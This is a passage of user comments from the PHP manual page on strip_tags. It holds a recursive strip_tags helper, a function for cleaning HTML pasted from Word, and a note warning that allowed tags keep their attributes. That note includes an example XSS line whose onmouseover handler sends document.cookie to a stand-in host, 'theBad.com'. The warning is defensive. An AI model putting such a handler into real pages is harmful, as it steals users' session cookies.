<div class="phpcode"><code><span class="html">Here is a recursive function for strip_tags like the one showed in the stripslashes manual page.<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">strip_tags_deep</span><span class="keyword">(</span><span class="default">$value</span><span class="keyword">)<br />{<br />  return </span><span class="default">is_array</span><span class="keyword">(</span><span class="default">$value</span><span class="keyword">) ?<br />    </span><span class="default">array_map</span><span class="keyword">(</span><span class="string">'strip_tags_deep'</span><span class="keyword">, </span><span class="default">$value</span><span class="keyword">) :<br />    </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$value</span><span class="keyword">);<br />}<br /><br /></span><span class="comment">// Example<br /></span><span class="default">$array </span><span class="keyword">= array(</span><span class="string">'&lt;b&gt;Foo&lt;/b&gt;'</span><span class="keyword">, </span><span class="string">'&lt;i&gt;Bar&lt;/i&gt;'</span><span class="keyword">, array(</span><span class="string">'&lt;b&gt;Foo&lt;/b&gt;'</span><span class="keyword">, </span><span class="string">'&lt;i&gt;Bar&lt;/i&gt;'</span><span class="keyword">));<br /></span><span class="default">$array </span><span class="keyword">= </span><span class="default">strip_tags_deep</span><span class="keyword">(</span><span class="default">$array</span><span class="keyword">);<br /><br /></span><span class="comment">// Output<br /></span><span class="default">print_r</span><span class="keyword">(</span><span class="default">$array</span><span class="keyword">);<br /></span><span class="default">?&gt;</span></span></code></div>
  </div>
 </div>
  <div class="note" id="99643">  <div class="votes">
    <div id="Vu99643">
    <a href="/manual/vote-note.php?id=99643&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd99643">
    <a href="/manual/vote-note.php?id=99643&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V99643" title="53% like this...">
    5
    </div>
  </div>
  <a href="#99643" class="name">
  <strong class="user"><em>tom at cowin dot us</em></strong></a><a class="genanchor" href="#99643"> &para;</a><div class="date" title="2010-08-27 07:04"><strong>15 years ago</strong></div>
  <div class="text" id="Hcom99643">
<div class="phpcode"><code><span class="html">With most web based user input of more than a line of text, it seems I get 90% 'paste from Word'. I've developed this fn over time to try to strip all of this cruft out. A few things I do here are application specific, but if it helps you - great, if you can improve on it or have a better way - please - post it... 
<br />
<br /><span class="default">&lt;?php
<br />
<br />    </span><span class="keyword">function </span><span class="default">strip_word_html</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$allowed_tags </span><span class="keyword">= </span><span class="string">'&lt;b&gt;&lt;i&gt;&lt;sup&gt;&lt;sub&gt;&lt;em&gt;&lt;strong&gt;&lt;u&gt;&lt;br&gt;'</span><span class="keyword">)
<br />    {
<br />        </span><span class="default">mb_regex_encoding</span><span class="keyword">(</span><span class="string">'UTF-8'</span><span class="keyword">);
<br />        </span><span class="comment">//replace MS special characters first
<br />        </span><span class="default">$search </span><span class="keyword">= array(</span><span class="string">'/&amp;lsquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;rsquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;ldquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;rdquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;mdash;/u'</span><span class="keyword">);
<br />        </span><span class="default">$replace </span><span class="keyword">= array(</span><span class="string">'\''</span><span class="keyword">, </span><span class="string">'\''</span><span class="keyword">, </span><span class="string">'"'</span><span class="keyword">, </span><span class="string">'"'</span><span class="keyword">, </span><span class="string">'-'</span><span class="keyword">);
<br />        </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="default">$search</span><span class="keyword">, </span><span class="default">$replace</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);
<br />        </span><span class="comment">//make sure _all_ html entities are converted to the plain ascii equivalents - it appears
<br />        //in some MS headers, some html entities are encoded and some aren't
<br />        </span><span class="default">$text </span><span class="keyword">= </span><span class="default">html_entity_decode</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">ENT_QUOTES</span><span class="keyword">, </span><span class="string">'UTF-8'</span><span class="keyword">);
<br />        </span><span class="comment">//try to strip out any C style comments first, since these, embedded in html comments, seem to
<br />        //prevent strip_tags from removing html comments (MS Word introduced combination)
<br />        </span><span class="keyword">if(</span><span class="default">mb_stripos</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="string">'/*'</span><span class="keyword">) !== </span><span class="default">FALSE</span><span class="keyword">){
<br />            </span><span class="default">$text </span><span class="keyword">= </span><span class="default">mb_eregi_replace</span><span class="keyword">(</span><span class="string">'#/\*.*?\*/#s'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">, </span><span class="string">'m'</span><span class="keyword">);
<br />        }
<br />        </span><span class="comment">//introduce a space into any arithmetic expressions that could be caught by strip_tags so that they won't be
<br />        //'&lt;1' becomes '&lt; 1'(note: somewhat application specific)
<br />        </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(array(</span><span class="string">'/&lt;([0-9]+)/'</span><span class="keyword">), array(</span><span class="string">'&lt; $1'</span><span class="keyword">), </span><span class="default">$text</span><span class="keyword">);
<br />        </span><span class="default">$text </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$allowed_tags</span><span class="keyword">);
<br />        </span><span class="comment">//eliminate extraneous whitespace from start and end of line, or anywhere there are two or more spaces, convert it to one
<br />        </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(array(</span><span class="string">'/^\s\s+/'</span><span class="keyword">, </span><span class="string">'/\s\s+$/'</span><span class="keyword">, </span><span class="string">'/\s\s+/u'</span><span class="keyword">), array(</span><span class="string">''</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">), </span><span class="default">$text</span><span class="keyword">);
<br />        </span><span class="comment">//strip out inline css and simplify style tags
<br />        </span><span class="default">$search </span><span class="keyword">= array(</span><span class="string">'#&lt;(strong|b)[^&gt;]*&gt;(.*?)&lt;/(strong|b)&gt;#isu'</span><span class="keyword">, </span><span class="string">'#&lt;(em|i)[^&gt;]*&gt;(.*?)&lt;/(em|i)&gt;#isu'</span><span class="keyword">, </span><span class="string">'#&lt;u[^&gt;]*&gt;(.*?)&lt;/u&gt;#isu'</span><span class="keyword">);
<br />        </span><span class="default">$replace </span><span class="keyword">= array(</span><span class="string">'&lt;b&gt;$2&lt;/b&gt;'</span><span class="keyword">, </span><span class="string">'&lt;i&gt;$2&lt;/i&gt;'</span><span class="keyword">, </span><span class="string">'&lt;u&gt;$1&lt;/u&gt;'</span><span class="keyword">);
<br />        </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="default">$search</span><span class="keyword">, </span><span class="default">$replace</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);
<br />        </span><span class="comment">//on some of the ?newer MS Word exports, where you get conditionals of the form 'if gte mso 9', etc., it appears
<br />        //that whatever is in one of the html comments prevents strip_tags from eradicating the html comment that contains
<br />        //some MS Style Definitions - this last bit gets rid of any leftover comments */
<br />        </span><span class="default">$num_matches </span><span class="keyword">= </span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">"/\&lt;!--/u"</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">, </span><span class="default">$matches</span><span class="keyword">);
<br />        if(</span><span class="default">$num_matches</span><span class="keyword">){
<br />              </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/\&lt;!--(.)*--\&gt;/isu'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);
<br />        }
<br />        return </span><span class="default">$text</span><span class="keyword">;
<br />    }
<br /></span><span class="default">?&gt;</span></span></code></div>
  </div>
 </div>
  <div class="note" id="115354">  <div class="votes">
    <div id="Vu115354">
    <a href="/manual/vote-note.php?id=115354&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd115354">
    <a href="/manual/vote-note.php?id=115354&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V115354" title="51% like this...">
    2
    </div>
  </div>
  <a href="#115354" class="name">
  <strong class="user"><em>bnt dot gloria at outlook dot com</em></strong></a><a class="genanchor" href="#115354"> &para;</a><div class="date" title="2014-07-10 03:52"><strong>11 years ago</strong></div>
  <div class="text" id="Hcom115354">
<div class="phpcode"><code><span class="html">With allowable_tags, strip-tags is not safe.<br /><br /><span class="default">&lt;?php<br /><br />$str</span><span class="keyword">= </span><span class="string">"&lt;p onmouseover=\"window.location='<a href="http://www.theBad.com/?cookie=" rel="nofollow" target="_blank">http://www.theBad.com/?cookie=</a>'+document.cookie;\"&gt; don't mouseover &lt;/p&gt;"</span><span class="keyword">;<br /></span><span class="default">$str</span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">, </span><span class="string">'&lt;p&gt;'</span><span class="keyword">);<br />echo </span><span class="default">$str</span><span class="keyword">; </span><span class="comment">// DISPLAY: &lt;p onmouseover=\"window.location='<a href="http://www.theBad.com/?cookie=" rel="nofollow" target="_blank">http://www.theBad.com/?cookie=</a>'+document.cookie;\"&gt; don't mouseover &lt;/p&gt;";<br /><br /></span><span class="default">?&gt;</span></span></code></div>
  </div>
 </div></div>
<div class="foot"><a href="/manual/add-note.php?sect=function.strip-tags&amp;repo=en&amp;redirect=https://www.php.net/manual/en/function.strip-tags.php">＋<small>add a note</small></a></div>
</section>    </section><!-- layout-content -->
        <aside class='layout-menu'>

        <ul class='parent-menu-list'>
                                    <li>
                <a href="ref.strings.php">String Functions</a>

                                    <ul class='child-menu-list'>

                                                <li class="">
                            <a href="function.addcslashes.php" title="addcslashes">addcslashes</a>
                        </li>
                                                <li class="">
                            <a href="function.addslashes.php" title="addslashes">addslashes</a>
                        </li>
                                                <li class="">
                            <a href="function.bin2hex.php" title="bin2hex">bin2hex</a>
                        </li>
                                                <li class="">
                            <a href="function.chop.php" title="chop">chop</a>
                        </li>
                                                <li class="">
                            <a href="function.chr.php" title="chr">chr</a>
                        </li>
                                                <li class="">
                            <a href="function.chunk-split.php" title="chunk_&#8203;split">chunk_&#8203;split</a>
                        </li>
                                                <li class="">
                            <a href="function.convert-uudecode.php" title="convert_&#8203;uudecode">convert_&#8203;uudecode</a>
                        </li>
                                                <li class="">
                            <a href="function.convert-uuencode.php" title="convert_&#8203;uuencode">convert_&#8203;uuencode</a>
                        </li>
                                                <li class="">
                            <a href="function.count-chars.php" title="count_&#8203;chars">count_&#8203;chars</a>
                        </li>
                                                <li class="">
                            <a href="function.crc32.php" title="crc32">crc32</a>
                        </li>
                                                <li class="">
                            <a href="function.crypt.php" title="crypt">crypt</a>
                        </li>
                                                <li class="">
                            <a href="function.echo.php" title="echo">echo</a>
                        </li>
                                                <li class="">
                            <a href="function.explode.php" title="explode">explode</a>
                        </li>
                                                <li class="">
                            <a href="function.fprintf.php" title="fprintf">fprintf</a>
                        </li>
                                                <li class="">
                            <a href="function.get-html-translation-table.php" title="get_&#8203;html_&#8203;translation_&#8203;table">get_&#8203;html_&#8203;translation_&#8203;table</a>
                        </li>
                                                <li class="">
                            <a href="function.hebrev.php" title="hebrev">hebrev</a>
                        </li>
                                                <li class="">
                            <a href="function.hex2bin.php" title="hex2bin">hex2bin</a>
                        </li>
                                                <li class="">
                            <a href="function.html-entity-decode.php" title="html_&#8203;entity_&#8203;decode">html_&#8203;entity_&#8203;decode</a>
                        </li>
                                                <li class="">
                            <a href="function.htmlentities.php" title="htmlentities">htmlentities</a>
                        </li>
                                                <li class="">
                            <a href="function.htmlspecialchars.php" title="htmlspecialchars">htmlspecialchars</a>
                        </li>
                                                <li class="">
                            <a href="function.htmlspecialchars-decode.php" title="htmlspecialchars_&#8203;decode">htmlspecialchars_&#8203;decode</a>
                        </li>
                                                <li class="">
                            <a href="function.implode.php" title="implode">implode</a>
                        </li>
                                                <li class="">
                            <a href="function.join.php" title="join">join</a>
                        </li>
                                                <li class="">
                            <a href="function.lcfirst.php" title="lcfirst">lcfirst</a>
                        </li>
                                                <li class="">
                            <a href="function.levenshtein.php" title="levenshtein">levenshtein</a>
                        </li>
                                                <li class="">
                            <a href="function.localeconv.php" title="localeconv">localeconv</a>
                        </li>
                                                <li class="">
                            <a href="function.ltrim.php" title="ltrim">ltrim</a>
                        </li>
                                                <li class="">
                            <a href="function.md5.php" title="md5">md5</a>
                        </li>
                                                <li class="">
                            <a href="function.md5-file.php" title="md5_&#8203;file">md5_&#8203;file</a>
                        </li>
                                                <li class="">
                            <a href="function.metaphone.php" title="metaphone">metaphone</a>
                        </li>
                                                <li class="">
                            <a href="function.nl-langinfo.php" title="nl_&#8203;langinfo">nl_&#8203;langinfo</a>
                        </li>
                                                <li class="">
                            <a href="function.nl2br.php" title="nl2br">nl2br</a>
                        </li>
                                                <li class="">
                            <a href="function.number-format.php" title="number_&#8203;format">number_&#8203;format</a>
                        </li>
                                                <li class="">
                            <a href="function.ord.php" title="ord">ord</a>
                        </li>
                                                <li class="">
                            <a href="function.parse-str.php" title="parse_&#8203;str">parse_&#8203;str</a>
                        </li>
                                                <li class="">
                            <a href="function.print.php" title="print">print</a>
                        </li>
                                                <li class="">
                            <a href="function.printf.php" title="printf">printf</a>
                        </li>
                                                <li class="">
                            <a href="function.quoted-printable-decode.php" title="quoted_&#8203;printable_&#8203;decode">quoted_&#8203;printable_&#8203;decode</a>
                        </li>
                                                <li class="">
                            <a href="function.quoted-printable-encode.php" title="quoted_&#8203;printable_&#8203;encode">quoted_&#8203;printable_&#8203;encode</a>
                        </li>
                                                <li class="">
                            <a href="function.quotemeta.php" title="quotemeta">quotemeta</a>
                        </li>
                                                <li class="">
                            <a href="function.rtrim.php" title="rtrim">rtrim</a>
                        </li>
                                                <li class="">
                            <a href="function.setlocale.php" title="setlocale">setlocale</a>
                        </li>
                                                <li class="">
                            <a href="function.sha1.php" title="sha1">sha1</a>
                        </li>
                                                <li class="">
                            <a href="function.sha1-file.php" title="sha1_&#8203;file">sha1_&#8203;file</a>
                        </li>
                                                <li class="">
                            <a href="function.similar-text.php" title="similar_&#8203;text">similar_&#8203;text</a>
                        </li>
                                                <li class="">
                            <a href="function.soundex.php" title="soundex">soundex</a>
                        </li>
                                                <li class="">
                            <a href="function.sprintf.php" title="sprintf">sprintf</a>
                        </li>
                                                <li class="">
                            <a href="function.sscanf.php" title="sscanf">sscanf</a>
                        </li>
                                                <li class="">
                            <a href="function.str-contains.php" title="str_&#8203;contains">str_&#8203;contains</a>
                        </li>
                                                <li class="">
                            <a href="function.str-decrement.php" title="str_&#8203;decrement">str_&#8203;decrement</a>
                        </li>
                                                <li class="">
                            <a href="function.str-ends-with.php" title="str_&#8203;ends_&#8203;with">str_&#8203;ends_&#8203;with</a>
                        </li>
                                                <li class="">
                            <a href="function.str-getcsv.php" title="str_&#8203;getcsv">str_&#8203;getcsv</a>
                        </li>
                                                <li class="">
                            <a href="function.str-increment.php" title="str_&#8203;increment">str_&#8203;increment</a>
                        </li>
                                                <li class="">
                            <a href="function.str-ireplace.php" title="str_&#8203;ireplace">str_&#8203;ireplace</a>
                        </li>
                                                <li class="">
                            <a href="function.str-pad.php" title="str_&#8203;pad">str_&#8203;pad</a>
                        </li>
                                                <li class="">
                            <a href="function.str-repeat.php" title="str_&#8203;repeat">str_&#8203;repeat</a>
                        </li>
                                                <li class="">
                            <a href="function.str-replace.php" title="str_&#8203;replace">str_&#8203;replace</a>
                        </li>
                                                <li class="">
                            <a href="function.str-rot13.php" title="str_&#8203;rot13">str_&#8203;rot13</a>
                        </li>
                                                <li class="">
                            <a href="function.str-shuffle.php" title="str_&#8203;shuffle">str_&#8203;shuffle</a>
                        </li>
                                                <li class="">
                            <a href="function.str-split.php" title="str_&#8203;split">str_&#8203;split</a>
                        </li>
                                                <li class="">
                            <a href="function.str-starts-with.php" title="str_&#8203;starts_&#8203;with">str_&#8203;starts_&#8203;with</a>
                        </li>
                                                <li class="">
                            <a href="function.str-word-count.php" title="str_&#8203;word_&#8203;count">str_&#8203;word_&#8203;count</a>
                        </li>
                                                <li class="">
                            <a href="function.strcasecmp.php" title="strcasecmp">strcasecmp</a>
                        </li>
                                                <li class="">
                            <a href="function.strchr.php" title="strchr">strchr</a>
                        </li>
                                                <li class="">
                            <a href="function.strcmp.php" title="strcmp">strcmp</a>
                        </li>
                                                <li class="">
                            <a href="function.strcoll.php" title="strcoll">strcoll</a>
                        </li>
                                                <li class="">
                            <a href="function.strcspn.php" title="strcspn">strcspn</a>
                        </li>
                                                <li class="current">
                            <a href="function.strip-tags.php" title="strip_&#8203;tags">strip_&#8203;tags</a>
                        </li>
                                                <li class="">
                            <a href="function.stripcslashes.php" title="stripcslashes">stripcslashes</a>
                        </li>
                                                <li class="">
                            <a href="function.stripos.php" title="stripos">stripos</a>
                        </li>
                                                <li class="">
                            <a href="function.stripslashes.php" title="stripslashes">stripslashes</a>
                        </li>
                                                <li class="">
                            <a href="function.stristr.php" title="stristr">stristr</a>
                        </li>
                                                <li class="">
                            <a href="function.strlen.php" title="strlen">strlen</a>
                        </li>
                                                <li class="">
                            <a href="function.strnatcasecmp.php" title="strnatcasecmp">strnatcasecmp</a>
                        </li>
                                                <li class="">
                            <a href="function.strnatcmp.php" title="strnatcmp">strnatcmp</a>
                        </li>
                                                <li class="">
                            <a href="function.strncasecmp.php" title="strncasecmp">strncasecmp</a>
                        </li>
                                                <li class="">
                            <a href="function.strncmp.php" title="strncmp">strncmp</a>
                        </li>
                                                <li class="">
                            <a href="function.strpbrk.php" title="strpbrk">strpbrk</a>
                        </li>
                                                <li class="">
                            <a href="function.strpos.php" title="strpos">strpos</a>
                        </li>
                                                <li class="">
                            <a href="function.strrchr.php" title="strrchr">strrchr</a>
                        </li>
                                                <li class="">
                            <a href="function.strrev.php" title="strrev">strrev</a>
                        </li>
                                                <li class="">
                            <a href="function.strripos.php" title="strripos">strripos</a>
                        </li>
                                                <li class="">
                            <a href="function.strrpos.php" title="strrpos">strrpos</a>
                        </li>
                                                <li class="">
                            <a href="function.strspn.php" title="strspn">strspn</a>
                        </li>
                                                <li class="">
                            <a href="function.strstr.php" title="strstr">strstr</a>
                        </li>
                                                <li class="">
                            <a href="function.strtok.php" title="strtok">strtok</a>
                        </li>
                                                <li class="">
                            <a href="function.strtolower.php" title="strtolower">strtolower</a>
                        </li>
                                                <li class="">
                            <a href="function.strtoupper.php" title="strtoupper">strtoupper</a>
                        </li>
                                                <li class="">
                            <a href="function.strtr.php" title="strtr">strtr</a>
                        </li>
                                                <li class="">
                            <a href="function.substr.php" title="substr">substr</a>
                        </li>
                                                <li class="">
                            <a href="function.substr-compare.php" title="substr_&#8203;compare">substr_&#8203;compare</a>
                        </li>
                                                <li class="">
                            <a href="function.substr-count.php" title="substr_&#8203;count">substr_&#8203;count</a>
                        </li>
                                                <li class="">
                            <a href="function.substr-replace.php" title="substr_&#8203;replace">substr_&#8203;replace</a>
                        </li>
                                                <li class="">
                            <a href="function.trim.php" title="trim">trim</a>
                        </li>
                                                <li class="">
                            <a href="function.ucfirst.php" title="ucfirst">ucfirst</a>
                        </li>
                                                <li class="">
                            <a href="function.ucwords.php" title="ucwords">ucwords</a>
                        </li>
                                                <li class="">
                            <a href="function.vfprintf.php" title="vfprintf">vfprintf</a>
                        </li>
                                                <li class="">
                            <a href="function.vprintf.php" title="vprintf">vprintf</a>
                        </li>
                                                <li class="">
                            <a href="function.vsprintf.php" title="vsprintf">vsprintf</a>
                        </li>
                                                <li class="">
                            <a href="function.wordwrap.php" title="wordwrap">wordwrap</a>
                        </li>
                        
                    </ul>
                
            </li>
                        
                        <li>
                <span class="header">Deprecated</span>
                <ul class="child-menu-list">
                                    <li class="">
                        <a href="function.convert-cyr-string.php" title="convert_&#8203;cyr_&#8203;string">convert_&#8203;cyr_&#8203;string</a>
                    </li>
                                    <li class="">
                        <a href="function.hebrevc.php" title="hebrevc">hebrevc</a>
                    </li>
                                    <li class="">
                        <a href="function.money-format.php" title="money_&#8203;format">money_&#8203;format</a>
                    </li>
                                    <li class="">
                        <a href="function.utf8-decode.php" title="utf8_&#8203;decode">utf8_&#8203;decode</a>
                    </li>
                                    <li class="">
                        <a href="function.utf8-encode.php" title="utf8_&#8203;encode">utf8_&#8203;encode</a>
                    </li>
                                </ul>
            </li>
                    </ul>
    </aside>


  </div><!-- layout -->

  <footer>
    <div class="container footer-content">
      <div class="row-fluid">
      <ul class="footmenu">
        <li><a href="/manual/en/copyright.php">Copyright &copy; 2001-2025 The PHP Documentation Group</a></li>
        <li><a href="/my.php">My PHP.net</a></li>
        <li><a href="/contact.php">Contact</a></li>
        <li><a href="/sites.php">Other PHP.net sites</a></li>
        <li><a href="/privacy.php">Privacy policy</a></li>
      </ul>
      </div>
    </div>
  </footer>

    
<script src="/manual/en/js/ext/jquery-3.6.0.min.js"></script>
<script src="/manual/en/js/ext/FuzzySearch.min.js"></script>
<script src="/manual/en/js/ext/mousetrap.min.js"></script>
<script src="/manual/en/js/ext/jquery.scrollTo.min.js"></script>
<script src="/manual/en/js/search.js"></script>
<script src="/manual/en/js/common.js"></script>
<script type="module" src="/manual/en/js/interactive-examples.js"></script>

<a id="toTop" href="javascript:;"><span id="toTopHover"></span><img width="40" height="40" alt="To Top" src="/images/to-top@2x.png"></a>

<div id="search-modal__backdrop" class="search-modal__backdrop">
  <div
    role="dialog"
    aria-label="Search modal"
    id="search-modal"
    class="search-modal"
  >
    <div class="search-modal__header">
      <div class="search-modal__form">
        <div class="search-modal__input-icon">
          <!-- https://feathericons.com search -->
          <svg xmlns="http://www.w3.org/2000/svg"
            aria-hidden="true"
            width="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <circle cx="11" cy="11" r="8"></circle>
            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
          </svg>
        </div>
        <input
          type="search"
          id="search-modal__input"
          class="search-modal__input"
          placeholder="Search docs"
          aria-label="Search docs"
        />
      </div>

      <button aria-label="Close" class="search-modal__close">
        <!-- https://pictogrammers.com/library/mdi/icon/close/ -->
        <svg
          xmlns="http://www.w3.org/2000/svg"
          aria-hidden="true"
          width="24"
          viewBox="0 0 24 24"
        >
          <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
        </svg>
      </button>
    </div>
    <div
      role="listbox"
      aria-label="Search results"
      id="search-modal__results"
      class="search-modal__results"
    ></div>
    <div class="search-modal__helper-text">
      <div>
        <kbd>↑</kbd> and <kbd>↓</kbd> to navigate •
        <kbd>Enter</kbd> to select •
        <kbd>Esc</kbd> to close
      </div>
      <div>
        Press <kbd>Enter</kbd> without
        selection to search using Google
      </div>
    </div>
  </div>
</div>

</body>
</html>
